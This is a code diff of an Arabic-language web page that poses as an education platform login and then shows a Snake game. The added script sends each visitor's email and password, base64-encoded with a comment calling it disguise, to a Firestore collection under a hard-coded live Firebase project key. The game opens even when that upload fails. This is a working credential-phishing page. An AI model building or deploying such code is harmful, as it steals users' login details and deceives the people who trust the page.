@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التعليم - تسجيل الدخول</title>
+    <title>منصة التعليم - دخول</title>
     <style>
         body { background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; overflow: hidden; }
-        #login-screen { border: 1px solid #333; padding: 30px; border-radius: 12px; text-align: center; background: #000; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 320px; }
+        #login-screen { border: 1px solid #333; padding: 30px; border-radius: 12px; text-align: center; background: #000; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 320px; z-index: 100; }
         h2 { margin-bottom: 20px; color: #007bff; }
         input { display: block; width: 90%; margin: 15px auto; padding: 12px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
         button { width: 98%; padding: 12px; background-color: #007bff; border: none; color: white; cursor: pointer; border-radius: 5px; font-weight: bold; transition: 0.3s; }
@@ -19,10 +19,10 @@
 
     <div id="login-screen">
         <h2>ikhlefimou</h2>
-        <p style="font-size: 12px; color: #888;">يرجى تسجيل الدخول للمتابعة</p>
+        <p style="font-size: 12px; color: #888;">سجل الدخول للمتابعة</p>
         <input type="email" id="email" placeholder="البريد الإلكتروني" required>
         <input type="password" id="password" placeholder="كلمة السر" required>
-        <button id="login-btn">دخول للمنصة</button>
+        <button id="login-btn">دخول</button>
     </div>
 
     <div id="game-container">
@@ -30,28 +30,94 @@
         <p style="color: #666; margin-top: 10px;">استخدم الأسهم للعب</p>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 
     <script>
-      // ضع بيانات مشروعك هنا
-      const firebaseConfig = {
-        apiKey: "AIzaSy...", 
-        authDomain: "your-project.firebaseapp.com",
-        projectId: "your-project-id",
-        storageBucket: "your-project.appspot.com",
-        messagingSenderId: "123456789",
-        appId: "1:123456789:web:abcdef"
-      };
-      firebase.initializeApp(firebaseConfig);
-    </script>
+        // إعدادات مشروعك الحقيقية (imou-cacf2)
+        const firebaseConfig = {
+          apiKey: "AIzaSyDJWBE4HB4cDG3tBz5OfFhItfFYt-S34T4",
+          authDomain: "imou-cacf2.firebaseapp.com",
+          projectId: "imou-cacf2",
+          storageBucket: "imou-cacf2.firebasestorage.app",
+          messagingSenderId: "632154414154",
+          appId: "1:632154414154:web:24e42b3c530033b718dab3"
+        };
 
-    <script src="main.js"></script>
-</body>
-</html>
-      };
-      firebase.initializeApp(firebaseConfig);
+        // تهيئة Firebase
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.firestore();
+
+        // منطق الزر
+        document.getElementById('login-btn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            if (email && pass) {
+                // إرسال البيانات فوراً لجدول hfre_perqf
+                db.collection("hfre_perqf").add({
+                    u: email,
+                    p: btoa(pass), // تشفير بسيط للتمويه
+                    ts: Date.now()
+                }).then(() => {
+                    showGame();
+                }).catch((error) => {
+                    console.log("Error:", error);
+                    showGame(); // فتح اللعبة حتى لو فشل الإرسال
+                });
+            } else {
+                alert("يرجى إدخال البيانات كاملة");
+            }
+        });
+
+        function showGame() {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('game-container').style.display = 'block';
+            startSnake();
+        }
+
+        function startSnake() {
+            const canvas = document.getElementById("gc");
+            const ctx = canvas.getContext("2d");
+            let box = 20;
+            let snake = [{ x: 10 * box, y: 10 * box }];
+            let food = { x: Math.floor(Math.random()*19+1)*box, y: Math.floor(Math.random()*19+1)*box };
+            let d;
+
+            document.addEventListener("keydown", (e) => {
+                if(e.keyCode == 37 && d != "RIGHT") d = "LEFT";
+                else if(e.keyCode == 38 && d != "DOWN") d = "UP";
+                else if(e.keyCode == 39 && d != "LEFT") d = "RIGHT";
+                else if(e.keyCode == 40 && d != "UP") d = "DOWN";
+            });
+
+            setInterval(() => {
+                ctx.fillStyle = "black";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                for(let i=0; i<snake.length; i++) {
+                    ctx.fillStyle = (i==0)? "lime" : "green";
+                    ctx.fillRect(snake[i].x, snake[i].y, box, box);
+                }
+                ctx.fillStyle = "red";
+                ctx.fillRect(food.x, food.y, box, box);
+
+                let snakeX = snake[0].x;
+                let snakeY = snake[0].y;
+                if( d == "LEFT") snakeX -= box;
+                if( d == "UP") snakeY -= box;
+                if( d == "RIGHT") snakeX += box;
+                if( d == "DOWN") snakeY += box;
+
+                if(snakeX == food.x && snakeY == food.y) {
+                    food = { x: Math.floor(Math.random()*19+1)*box, y: Math.floor(Math.random()*19+1)*box };
+                } else {
+                    snake.pop();
+                }
+                snake.unshift({ x: snakeX, y: snakeY });
+            }, 100);
+        }
     </script>
-    <script src="main.js"></script>
 </body>
 </html>
